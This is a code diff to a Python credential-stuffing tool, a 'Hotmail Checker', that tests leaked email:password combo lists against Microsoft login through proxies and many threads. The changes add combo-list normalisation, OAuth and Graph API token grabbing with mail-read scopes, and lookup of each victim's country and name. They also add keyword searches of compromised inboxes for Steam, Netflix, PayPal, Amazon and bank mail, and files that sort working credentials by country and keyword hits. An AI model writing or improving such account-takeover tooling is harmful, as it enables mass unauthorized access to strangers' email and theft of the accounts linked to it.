@@ -10,6 +10,7 @@ import uuid
 import requests
 import urllib3
 import ctypes
+import json
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from requests.adapters import HTTPAdapter
@@ -23,6 +24,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 GRAY = '\033[90m'
 BLUE = '\033[94m'
 ORANGE = '\033[38;5;208m'
+GREEN = '\033[92m'
+RED = '\033[91m'
 
 LEFT_COL_WIDTH = 55
 
@@ -33,10 +36,87 @@ def pad_to_column(left_part):
     n = LEFT_COL_WIDTH - visible_length(left_part)
     return left_part + (" " * n if n > 0 else " ")
 
+def get_flag(country_code: str) -> str:
+    flag_map = {
+        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
+        'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
+        'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
+        'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
+        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
+        'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
+        'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
+        'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
+    }
+    return flag_map.get(country_code.upper(), '🏴')
+
+def normalize_combo(line):
+    line = line.strip()
+    if not line:
+        return None
+    
+    if ':' in line:
+        parts = line.split(':', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if '|' in line:
+        parts = line.split('|', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if ';' in line:
+        parts = line.split(';', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if ',' in line:
+        parts = line.split(',', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if ' ' in line:
+        parts = line.split(' ', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if '\t' in line:
+        parts = line.split('\t', 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if email and password and '@' in email:
+            return f"{email}:{password}"
+    
+    if '@' in line and line.count('@') == 1:
+        return None
+    
+    return None
+
+def load_and_normalize_accounts(filepath):
+    accounts = []
+    with open(filepath, 'r', encoding='utf-8') as f:
+        lines = f.readlines()
+    
+    for line in lines:
+        normalized = normalize_combo(line)
+        if normalized:
+            accounts.append(normalized)
+    
+    return accounts
+
 if sys.platform == 'win32':
     os.system('cls')
     try:
-        ctypes.windll.kernel32.SetConsoleTitleW("Inbox Checker | Starting...")
+        ctypes.windll.kernel32.SetConsoleTitleW("Hotmail Checker | Starting...")
     except:
         pass
 else:
@@ -60,7 +140,6 @@ stats = {
 
 TOTAL_ACCOUNTS = 0
 SESSION_FOLDER = None
-
 start_time = time.time()
 
 def get_session_folder():
@@ -72,6 +151,8 @@ def get_session_folder():
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         SESSION_FOLDER = os.path.join(base, f"Inbox_{timestamp}")
         os.makedirs(SESSION_FOLDER, exist_ok=True)
+        os.makedirs(os.path.join(SESSION_FOLDER, "Countries"), exist_ok=True)
+        os.makedirs(os.path.join(SESSION_FOLDER, "Keywords"), exist_ok=True)
     return SESSION_FOLDER
 
 def ensure_keywords_file():
@@ -81,16 +162,9 @@ def ensure_keywords_file():
 Netflix
 PayPal
 Amazon
-Bank
-Invoice
-Receipt
-Verification
-Password Reset
 Security Alert"""
         with open(path, 'w', encoding='utf-8') as f:
             f.write(default)
-        print(f"{Fore.GREEN}[+] Created keywords file: {path}")
-        print(f"{Fore.CYAN}[*] Edit that file to add your search keywords (one per line).")
     return path
 
 def load_keywords_from_file():
@@ -105,11 +179,9 @@ def load_keywords_from_file():
         
         if not keywords:
             keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Bank"]
-            print(f"{Fore.YELLOW}[!] No keywords found in file. Using defaults: {keywords}")
         
         return keywords
     except Exception as e:
-        print(f"{Fore.RED}[!] Error reading keywords: {e}")
         return ["Steam", "Netflix", "PayPal"]
 
 class ConfigLoader:
@@ -127,7 +199,6 @@ class ConfigLoader:
             self.config.read(self.config_file, encoding='utf-8')
             self.parse_config()
         except Exception as e:
-            print(f"{Fore.RED}[!] Error loading config: {e}")
             self.create_default_config()
             self.parse_config()
 
@@ -142,7 +213,6 @@ class ConfigLoader:
         }
         with open(self.config_file, 'w', encoding='utf-8') as f:
             self.config.write(f)
-        print(f"{Fore.GREEN}[+] Created default config: {self.config_file}")
 
     def parse_config(self):
         self.settings['threads'] = self.config.getint('General', 'threads', fallback=100)
@@ -153,12 +223,6 @@ class ConfigLoader:
 config_loader = ConfigLoader()
 CONFIG = config_loader.settings
 
-def get_progress_string():
-    return f"{stats['checked']}/{TOTAL_ACCOUNTS}"
-
-def get_timestamp():
-    return time.strftime("%H:%M:%S")
-
 def save_result(filename, content):
     folder = get_session_folder()
     path = os.path.join(folder, filename)
@@ -166,16 +230,19 @@ def save_result(filename, content):
         with open(path, 'a', encoding='utf-8') as f:
             f.write(content + '\n')
 
+def save_country_result(country, email, password):
+    folder = os.path.join(get_session_folder(), 'Countries')
+    path = os.path.join(folder, f"{country}.txt")
+    with file_lock:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(f"{email}:{password}\n")
+
 def get_keywords_folder():
-    folder = os.path.join(get_session_folder(), 'Keywords')
-    if not os.path.exists(folder):
-        os.makedirs(folder)
-    return folder
+    return os.path.join(get_session_folder(), 'Keywords')
 
 def save_keyword_result(keyword, content):
     safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
-    filename = f"{safe_name}.txt"
-    path = os.path.join(get_keywords_folder(), filename)
+    path = os.path.join(get_keywords_folder(), f"{safe_name}.txt")
     with file_lock:
         with open(path, 'a', encoding='utf-8') as f:
             f.write(content + '\n')
@@ -219,6 +286,10 @@ class MicrosoftInboxChecker:
         self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
         self.session = create_optimized_session()
         self.session.proxies = {'http': proxy, 'https': proxy} if proxy else None
+        self.access_token = None
+        self.cid = None
+        self.country = None
+        self.name = None
         self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
 
     def get_urlPost_sFTTag(self):
@@ -336,7 +407,57 @@ class MicrosoftInboxChecker:
         
         return self.get_xbox_rps(urlPost, sFTTag)
 
-    def get_access_token_for_outlook(self):
+    def get_graph_token(self):
+        try:
+            client_id = '0000000048170EF2'
+            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
+            
+            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
+            
+            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
+            parsed_fragment = parse_qs(urlparse(r.url).fragment)
+            token = parsed_fragment.get('access_token', [None])[0]
+            
+            if not token:
+                scope = 'https://graph.microsoft.com/Mail.Read'
+                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
+                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
+                parsed_fragment = parse_qs(urlparse(r.url).fragment)
+                token = parsed_fragment.get('access_token', [None])[0]
+            
+            return token
+        except:
+            return None
+
+    def get_profile_via_graph(self, token):
+        try:
+            headers = {
+                'Authorization': f'Bearer {token}',
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0'
+            }
+            
+            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
+            
+            if r.status_code == 200:
+                data = r.json()
+                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
+                if not self.country or self.country == 'Unknown':
+                    try:
+                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
+                        if r2.status_code == 200:
+                            settings = r2.json()
+                            self.country = settings.get('timeZone', 'Unknown')
+                    except:
+                        pass
+                
+                self.name = data.get('displayName', 'Unknown')
+                return True
+            return False
+        except:
+            return False
+
+    def get_profile_via_substrate(self):
         try:
             self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
             
@@ -349,20 +470,85 @@ class MicrosoftInboxChecker:
             token = parsed_fragment.get('access_token', [None])[0]
             
             if not token:
-                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
-                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
-                parsed_fragment = parse_qs(urlparse(r.url).fragment)
-                token = parsed_fragment.get('access_token', [None])[0]
-                
-            return token
+                return False
+            
+            self.cid = self.session.cookies.get('MSPCID', self.email)
+            
+            headers = {
+                'Authorization': f'Bearer {token}',
+                'X-AnchorMailbox': f'CID:{self.cid}',
+                'Content-Type': 'application/json',
+                'User-Agent': 'Outlook-Android/2.0',
+                'Accept': 'application/json'
+            }
+            
+            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
+            
+            if r.status_code == 200:
+                data = r.json()
+                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
+                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
+                return True
+            return False
         except:
-            return None
+            return False
+
+    def check_inbox_via_graph(self):
+        token = self.get_graph_token()
+        if not token:
+            return 0, []
+        
+        found_info = []
+        total_found_sum = 0
+        
+        headers = {
+            'Authorization': f'Bearer {token}',
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0'
+        }
+        
+        for keyword in self.inbox_keywords:
+            try:
+                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
+                r = self.session.get(query, headers=headers, timeout=10, verify=False)
+                
+                if r.status_code == 200:
+                    data = r.json()
+                    total = data.get('@odata.count', 0)
+                    
+                    if total == 0 and 'value' in data:
+                        total = len(data['value'])
+                    
+                    if total > 0:
+                        total_found_sum += total
+                        found_info.append(f"{keyword}: {total}")
+                        
+                        try:
+                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
+                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
+                            if r2.status_code == 200:
+                                data2 = r2.json()
+                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
+                                if total2 > 0:
+                                    total_found_sum += total2
+                                    found_info.append(f"{keyword}(body): {total2}")
+                        except:
+                            pass
+            except:
+                pass
+        
+        return total_found_sum, found_info
 
     def check_inbox(self):
+        total_found, found_info = self.check_inbox_via_graph()
+        
+        if total_found > 0:
+            return total_found, found_info
+        
         token = self.get_access_token_for_outlook()
         if not token:
             return 0, []
-
+        
         cid = self.session.cookies.get('MSPCID', self.email)
         
         headers = {
@@ -375,12 +561,11 @@ class MicrosoftInboxChecker:
         }
 
         found_info = []
-        keywords = self.inbox_keywords
         total_found_sum = 0
         
         url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
         
-        for keyword in keywords:
+        for keyword in self.inbox_keywords:
             try:
                 payload = {
                     'Cvid': str(uuid.uuid4()),
@@ -424,6 +609,28 @@ class MicrosoftInboxChecker:
                 
         return total_found_sum, found_info
 
+    def get_access_token_for_outlook(self):
+        try:
+            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
+            
+            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
+            client_id = '0000000048170EF2'
+            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
+            
+            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
+            parsed_fragment = parse_qs(urlparse(r.url).fragment)
+            token = parsed_fragment.get('access_token', [None])[0]
+            
+            if not token:
+                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
+                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
+                parsed_fragment = parse_qs(urlparse(r.url).fragment)
+                token = parsed_fragment.get('access_token', [None])[0]
+                
+            return token
+        except:
+            return None
+
 def check_account_wrapper(combo, index, limiter, inbox_keywords):
     try:
         check_account(combo, index, inbox_keywords)
@@ -454,16 +661,34 @@ def check_account(combo, index, inbox_keywords):
             
             save_result('Valid.txt', f"{email}:{password}")
             
+            graph_token = checker.get_graph_token()
+            country_obtained = False
+            country = 'Unknown'
+            
+            if graph_token:
+                if checker.get_profile_via_graph(graph_token):
+                    country = checker.country or 'Unknown'
+                    country_obtained = True
+            
+            if not country_obtained:
+                if checker.get_profile_via_substrate():
+                    country = checker.country or 'Unknown'
+            
+            if country and country != 'Unknown':
+                save_country_result(country, email, password)
+            
             total_count, inbox_hits = checker.check_inbox()
+            
+            flag = get_flag(country) if country != 'Unknown' else '🏴'
             
             if total_count > 0:
                 hits_str = ' | '.join(inbox_hits)
-                save_string = f"{email}:{password} | {total_count} Email Found | [{hits_str}]"
+                save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
                 save_result('Inbox.txt', save_string)
                 for hit in inbox_hits:
                     if ': ' in hit:
                         kw, count = hit.rsplit(': ', 1)
-                        line = f"{email}:{password} | {count} Email Found | [{kw}: {count}]"
+                        line = f"{email}:{password} | {country} | {count} Email Found | [{kw}: {count}]"
                         save_keyword_result(kw, line)
                 
                 with stats_lock:
@@ -471,7 +696,7 @@ def check_account(combo, index, inbox_keywords):
                 
                 with print_lock:
                     left = f"{Fore.GREEN}[+]{Fore.GREEN} {email}{Style.RESET_ALL}"
-                    right_parts = [f"{GRAY}| Keywords: {Style.RESET_ALL}"]
+                    right_parts = [f"{GRAY}| {flag}{country} | Keywords: {Style.RESET_ALL}"]
                     for i, hit in enumerate(inbox_hits):
                         if ': ' in hit:
                             kw, count = hit.rsplit(': ', 1)
@@ -485,7 +710,7 @@ def check_account(combo, index, inbox_keywords):
             else:
                 with print_lock:
                     left = f"{Fore.GREEN}[+]{Fore.GREEN} {email}{Style.RESET_ALL}"
-                    right = f"{GRAY}| valid microsoft{Style.RESET_ALL}"
+                    right = f"{GRAY}| {flag}{country} | valid microsoft{Style.RESET_ALL}"
                     print(f"{pad_to_column(left)}{right}")
             
         elif status == '2FA':
@@ -519,7 +744,7 @@ def update_title():
     elapsed = time.time() - start_time
     cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
     
-    title = f"Hotmail Checker | Valid: {stats['valid']} | Bads: {stats['bad']} | Checked:{processed}/{TOTAL_ACCOUNTS} | Cpm: {cpm}"
+    title = f"Hotmail Checker | Valid: {stats['valid']} | Inbox: {stats['inbox']} | 2FA: {stats['2fa']} | Bad: {stats['bad']} | Checked:{processed}/{TOTAL_ACCOUNTS} | Cpm: {cpm}"
     if sys.platform == 'win32':
         try:
             ctypes.windll.kernel32.SetConsoleTitleW(title)
@@ -544,8 +769,8 @@ def main():
     get_session_folder()
     
     print(f"{Fore.CYAN}[*] Session folder: {get_session_folder()}")
-    print(f"{Fore.CYAN}[*] Keywords loaded from keywords.txt: {', '.join(inbox_keywords)}")
-    print(f"{Fore.CYAN}[*] Total keywords to search: {len(inbox_keywords)}")
+    print(f"{Fore.CYAN}[*] Graph API enabled for faster inbox checking")
+    print(f"{Fore.CYAN}[*] Loaded {len(inbox_keywords)} keywords")
     print()
 
     global proxies
@@ -554,8 +779,10 @@ def main():
     if os.path.exists(CONFIG['proxies_file']):
         with open(CONFIG['proxies_file'], 'r', encoding='utf-8') as f:
             proxies = [line.strip() for line in f if line.strip()]
+        if proxies:
+            print(f"{Fore.GREEN}[*] Loaded {len(proxies)} proxies")
     else:
-        pass
+        print(f"{Fore.YELLOW}[!] Proxies file not found: {CONFIG['proxies_file']}")
 
     if not os.path.exists(CONFIG['accounts_file']):
         print(f"{Fore.RED}[!] Accounts file not found: {CONFIG['accounts_file']}")
@@ -564,19 +791,15 @@ def main():
         print(f"{Fore.YELLOW}[*] Created dummy {CONFIG['accounts_file']}. Please add accounts.")
         return
 
-    with open(CONFIG['accounts_file'], 'r', encoding='utf-8') as f:
-        accounts = [line.strip() for line in f if ':' in line]
+    accounts = load_and_normalize_accounts(CONFIG['accounts_file'])
     
     if not accounts:
-        print(f"{Fore.RED}[!] No accounts found in {CONFIG['accounts_file']}")
         return
 
-    print(f"{Fore.GREEN}[*] Loaded {len(accounts)} accounts.")
     global TOTAL_ACCOUNTS
     TOTAL_ACCOUNTS = len(accounts)
     
     print(f"{Fore.CYAN}[*] Threads: {CONFIG['threads']}")
-    print(f"{Fore.CYAN}[*] Inbox Keywords (from keywords.txt): {', '.join(inbox_keywords)}")
     print()
 
     def ui_loop():
@@ -606,9 +829,13 @@ def main():
         time.sleep(1)
         update_title()
     
-    print(f"\n{Fore.GREEN}[*] Checking Completed.")
+    elapsed = time.time() - start_time
+    print(f"\n{Fore.GREEN}[*] Checking Completed in {elapsed:.2f}s")
     print(f"Valid: {stats['valid']}")
     print(f"Inbox Hits: {stats['inbox']}")
+    print(f"2FA: {stats['2fa']}")
+    print(f"Bad: {stats['bad']}")
+    print(f"Errors: {stats['errors']}")
     print(f"Results saved in: {get_session_folder()}")
     input("Press Enter to exit...")
 
